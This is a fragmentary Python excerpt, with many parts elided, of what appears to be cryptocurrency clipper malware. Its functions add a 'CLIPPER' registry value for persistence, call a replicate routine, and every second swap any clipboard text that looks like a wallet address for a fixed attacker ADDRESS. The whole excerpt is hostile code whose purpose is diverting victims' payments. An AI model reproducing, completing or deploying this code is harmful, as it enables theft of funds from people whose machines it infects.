...
def add_to_registry():
   ...
   winreg.SetValueEx(open_,"CLIPPER",0,winreg.REG_SZ,address)
...
def start():
    ...
    while True:
        ...
        if m.check(target_clipboard):
            logging.debug('Probably an address.') 
            logging.debug('Original clipboard: %s' % target_clipboard)
            logging.debug('Setting clipboard to %s' % ADDRESS)
            m.set_clipboard(ADDRESS)         
        
        else:
            logging.debug('Not an address?')

        time.sleep(1)

def main():
    if FirstTime:
        logging.debug('Starting Clipper')
        replicate()
        add_to_registry()
